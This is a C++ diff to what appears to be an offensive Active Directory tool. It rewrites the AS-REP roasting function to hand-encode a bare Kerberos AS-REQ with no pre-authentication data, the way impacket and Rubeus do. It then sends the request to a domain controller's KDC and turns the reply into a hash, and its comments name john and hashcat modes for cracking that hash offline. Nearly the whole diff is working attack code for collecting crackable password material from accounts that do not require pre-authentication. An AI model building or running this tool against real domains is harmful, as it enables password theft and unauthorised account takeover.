@@ -7,8 +7,9 @@
 #include <sstream>
 #include <iomanip>
 #include <algorithm>
-#include <iterator>
 #include <vector>
+#include <ctime>
+#include <random>
 #include "protocols/KdcClient.h"
 
 namespace {
@@ -132,6 +133,105 @@ AsRepEncPart parseAsRep(const uint8_t* data, size_t dataLen) {
     }
 
     return result;
+}
+
+// --- Minimal DER writer for a bare AS-REQ ----------------------------------
+// MIT's krb5_init_creds_step injects freshness / PAC-options pre-auth padata
+// (types 149/150) into the AS-REQ, which makes a Windows KDC demand
+// pre-authentication even from a DONT_REQ_PREAUTH account. AS-REP roasting
+// therefore needs a *bare* AS-REQ with no padata, the way impacket and Rubeus
+// build it -- so we hand-roll the few DER fields we need.
+using Bytes = std::vector<uint8_t>;
+
+void derLen(Bytes& out, size_t len) {
+    if (len < 0x80) {
+        out.push_back(static_cast<uint8_t>(len));
+        return;
+    }
+    uint8_t tmp[8];
+    int n = 0;
+    while (len) { tmp[n++] = static_cast<uint8_t>(len & 0xff); len >>= 8; }
+    out.push_back(static_cast<uint8_t>(0x80 | n));
+    for (int i = n - 1; i >= 0; --i) out.push_back(tmp[i]);
+}
+
+// Wraps content in a tag-length-value triple.
+Bytes derTlv(uint8_t tag, const Bytes& content) {
+    Bytes out;
+    out.push_back(tag);
+    derLen(out, content.size());
+    out.insert(out.end(), content.begin(), content.end());
+    return out;
+}
+
+// INTEGER (non-negative); prepends 0x00 when the high bit would imply a sign.
+Bytes derInt(uint32_t v) {
+    Bytes c;
+    uint8_t tmp[5];
+    int n = 0;
+    do { tmp[n++] = static_cast<uint8_t>(v & 0xff); v >>= 8; } while (v);
+    if (tmp[n - 1] & 0x80) c.push_back(0x00);
+    for (int i = n - 1; i >= 0; --i) c.push_back(tmp[i]);
+    return derTlv(kTagInteger, c);
+}
+
+Bytes derGeneralString(const std::string& s) {
+    return derTlv(0x1b, Bytes(s.begin(), s.end()));
+}
+
+Bytes derCtx(uint8_t n, const Bytes& inner) {
+    return derTlv(static_cast<uint8_t>(0xa0 | n), inner);
+}
+
+// PrincipalName ::= SEQUENCE { name-type [0] Int32, name-string [1] SEQ OF GeneralString }
+Bytes derPrincipalName(int nameType, const std::vector<std::string>& parts) {
+    Bytes strings;
+    for (const auto& p : parts) {
+        Bytes gs = derGeneralString(p);
+        strings.insert(strings.end(), gs.begin(), gs.end());
+    }
+    Bytes body = derCtx(0, derInt(static_cast<uint32_t>(nameType)));
+    Bytes ns = derCtx(1, derTlv(kTagSequence, strings));
+    body.insert(body.end(), ns.begin(), ns.end());
+    return derTlv(kTagSequence, body);
+}
+
+// Builds a bare AS-REQ (no pre-auth padata) for AS-REP roasting.
+Bytes buildBareAsReq(const std::string& username, const std::string& realmUpper,
+                     const std::vector<int32_t>& etypes, uint32_t nonce,
+                     const std::string& till) {
+    auto cat = [](Bytes& dst, const Bytes& s) { dst.insert(dst.end(), s.begin(), s.end()); };
+
+    Bytes body;
+    // [0] kdc-options BIT STRING (unused-bits=0, then renewable_ok = 0x00000010)
+    cat(body, derCtx(0, derTlv(0x03, Bytes{0x00, 0x00, 0x00, 0x00, 0x10})));
+    // [1] cname
+    cat(body, derCtx(1, derPrincipalName(1, {username})));            // NT-PRINCIPAL
+    // [2] realm
+    cat(body, derCtx(2, derGeneralString(realmUpper)));
+    // [3] sname  krbtgt/REALM
+    cat(body, derCtx(3, derPrincipalName(2, {"krbtgt", realmUpper}))); // NT-SRV-INST
+    // [5] till, [6] rtime
+    cat(body, derCtx(5, derTlv(0x18, Bytes(till.begin(), till.end()))));
+    cat(body, derCtx(6, derTlv(0x18, Bytes(till.begin(), till.end()))));
+    // [7] nonce
+    cat(body, derCtx(7, derInt(nonce)));
+    // [8] etype SEQUENCE OF Int32
+    {
+        Bytes el;
+        for (int32_t e : etypes) cat(el, derInt(static_cast<uint32_t>(e)));
+        cat(body, derCtx(8, derTlv(kTagSequence, el)));
+    }
+    Bytes reqBody = derTlv(kTagSequence, body);
+
+    // KDC-REQ ::= SEQUENCE { pvno [1]=5, msg-type [2]=10 (AS-REQ), req-body [4] }
+    Bytes kdcReq;
+    cat(kdcReq, derCtx(1, derInt(5)));
+    cat(kdcReq, derCtx(2, derInt(10)));
+    cat(kdcReq, derCtx(4, reqBody));
+
+    // [APPLICATION 10] AS-REQ
+    return derTlv(0x6a, derTlv(kTagSequence, kdcReq));
 }
 }  // namespace
 
@@ -260,73 +360,44 @@ std::string KerberosInteraction::requestAndFormatASREP(
     std::string upperRealm = realm;
     std::transform(upperRealm.begin(), upperRealm.end(), upperRealm.begin(), ::toupper);
 
-    auto principal = parsePrincipal(username + "@" + upperRealm);
-    if (!principal) {
-        return "";
-    }
-
-    // Offer AES (preferred) then RC4 in the AS-REQ etype list; the KDC returns
-    // the strongest key the account holds and formatASREP adapts to it. AES
-    // (etype 17/18) hashes crack with `john --format=krb5asrep`; RC4 (etype 23)
-    // with `hashcat -m 18200` (RC4 needs the account to hold an RC4 key and the
-    // local krb5 to permit it via allow_weak_crypto = true).
-    krb5_get_init_creds_opt* options = nullptr;
-    if (krb5_get_init_creds_opt_alloc(context_.get(), &options)) {
-        return "";
-    }
-    krb5_enctype etypes[] = {
+    // Offer AES (preferred) then RC4; the KDC returns the strongest key the
+    // account holds and formatASREP adapts to it. AES (etype 17/18) hashes crack
+    // with `john --format=krb5asrep`; RC4 (etype 23) with `hashcat -m 18200`.
+    const std::vector<int32_t> etypes = {
         ENCTYPE_AES256_CTS_HMAC_SHA1_96,
         ENCTYPE_AES128_CTS_HMAC_SHA1_96,
         ENCTYPE_ARCFOUR_HMAC,
     };
-    krb5_get_init_creds_opt_set_etype_list(options, etypes, std::size(etypes));
 
-    krb5_init_creds_context icc = nullptr;
-    krb5_error_code err = krb5_init_creds_init(
-        context_.get(), principal.get(), nullptr, nullptr, 0, options, &icc);
-    if (err) {
-        std::cerr << "[-] Failed to start AS-REQ for " << username << ": "
-                  << krb5_get_error_message(context_.get(), err) << std::endl;
-        krb5_get_init_creds_opt_free(context_.get(), options);
+    // till = now + 1 day, UTC, as "YYYYMMDDHHMMSSZ".
+    char tillBuf[32];
+    std::time_t t = std::time(nullptr) + 86400;
+    std::tm tmUtc{};
+    gmtime_r(&t, &tmUtc);
+    std::strftime(tillBuf, sizeof(tillBuf), "%Y%m%d%H%M%SZ", &tmUtc);
+
+    std::random_device rd;
+    const uint32_t nonce = static_cast<uint32_t>(rd()) & 0x7fffffff;
+
+    Bytes asReq = buildBareAsReq(username, upperRealm, etypes, nonce, tillBuf);
+
+    auto reply = KdcClient::exchange(kdcHost, 88, asReq.data(), asReq.size());
+    if (!reply) {
+        std::cerr << "[-] Could not reach KDC at " << kdcHost << ":88" << std::endl;
         return "";
     }
 
-    // First step (empty input) yields the AS-REQ bytes; we transport them
-    // ourselves and never feed the reply back, so no password is needed.
-    krb5_data in{};
-    krb5_data out{};
-    krb5_data realmData{};
-    unsigned int flags = 0;
-    err = krb5_init_creds_step(context_.get(), icc, &in, &out, &realmData, &flags);
-
     std::string hash;
-    if (!err && out.length > 0) {
-        auto reply = KdcClient::exchange(
-            kdcHost, 88, reinterpret_cast<const uint8_t*>(out.data), out.length);
-
-        if (!reply) {
-            std::cerr << "[-] Could not reach KDC at " << kdcHost << ":88" << std::endl;
-        } else {
-            AsRepEncPart encPart = parseAsRep(reply->data(), reply->size());
-            if (encPart.kdcError) {
-                std::cerr << "[-] KDC rejected AS-REQ for " << username
-                          << " (pre-auth required, no matching etype, or unknown account)" << std::endl;
-            } else if (encPart.ok) {
-                hash = KerberosTicketFormatter::formatASREP(
-                    username, upperRealm, encPart.etype, encPart.cipher, encPart.cipherLen);
-            } else {
-                std::cerr << "[-] Could not parse AS-REP for " << username << std::endl;
-            }
-        }
-    } else if (err) {
-        std::cerr << "[-] Failed to build AS-REQ for " << username << ": "
-                  << krb5_get_error_message(context_.get(), err) << std::endl;
+    AsRepEncPart encPart = parseAsRep(reply->data(), reply->size());
+    if (encPart.kdcError) {
+        std::cerr << "[-] KDC rejected AS-REQ for " << username
+                  << " (pre-auth required, or unknown account)" << std::endl;
+    } else if (encPart.ok) {
+        hash = KerberosTicketFormatter::formatASREP(
+            username, upperRealm, encPart.etype, encPart.cipher, encPart.cipherLen);
+    } else {
+        std::cerr << "[-] Could not parse AS-REP for " << username << std::endl;
     }
-
-    krb5_free_data_contents(context_.get(), &out);
-    krb5_free_data_contents(context_.get(), &realmData);
-    krb5_init_creds_free(context_.get(), icc);
-    krb5_get_init_creds_opt_free(context_.get(), options);
 
     return hash;
 }
